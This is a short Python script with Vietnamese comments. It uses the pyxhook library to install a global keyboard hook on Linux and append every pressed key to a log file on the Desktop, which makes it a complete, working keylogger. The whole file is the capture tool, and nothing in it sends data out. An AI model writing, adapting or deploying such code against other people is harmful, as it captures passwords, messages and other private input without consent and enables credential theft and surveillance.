#!/usr/bin/env python
import os  #import sys || os for linux and sys for windows
import pyxhook

#Tao file log va location
log_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('~/Desktop/filelogg.log')
)# ham get() dung khi printing key, co ich khi dung default
#"Desktop" in os.environ kiem tra neu ton tai key (tra ve ket qua true or false)
def OnkeyPress(event):
	with open(log_file, 'a' ) as f:
		f.write('{}\n'.format(event.key))

ghi_hook = pyxhook.HookManager()
ghi_hook.keyDown = OnkeyPress
ghi_hook.HookKeyboard()
try:
	ghi_hook.start()
except KeyboardInterrupt:
	pass
except Exception as ex:
	msg = 'Loi trong khi bat su kien\n {} '.format(ex)
	pyxhook.print_err(msg)
	with open(log_file, 'a') as f:
		f.write('\n{}'.format(msg))